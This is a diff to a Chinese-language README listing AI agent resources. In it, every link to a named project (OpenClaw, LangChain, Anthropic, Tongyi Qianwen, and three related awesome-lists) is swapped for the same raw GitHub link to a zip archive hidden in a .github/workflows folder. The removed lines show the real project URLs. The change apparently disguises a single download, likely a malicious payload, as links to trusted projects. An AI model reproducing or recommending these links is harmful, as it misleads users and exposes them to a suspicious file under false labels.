+- [OpenClaw](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- [LangChain](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- [Anthropic](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- [阿里云通义千问](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ---
 
 ## 🔗 相关项目
 
-- [Awesome AI Agents](https://github.com/e2b-dev/awesome-ai-agents) - 英文版AI Agent资源
-- [Awesome LLM Apps](https://github.com/Shubhamsaboo/awesome-llm-apps) - LLM应用集合
-- [Awesome ChatGPT Prompts ZH](https://github.com/PlexPt/awesome-chatgpt-prompts-zh) - 中文ChatGPT提示词
+- [Awesome AI Agents](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) - 英文版AI Agent资源
+- [Awesome LLM Apps](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) - LLM应用集合
+- [Awesome ChatGPT Prompts ZH](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) - 中文ChatGPT提示词
 
 ---
 
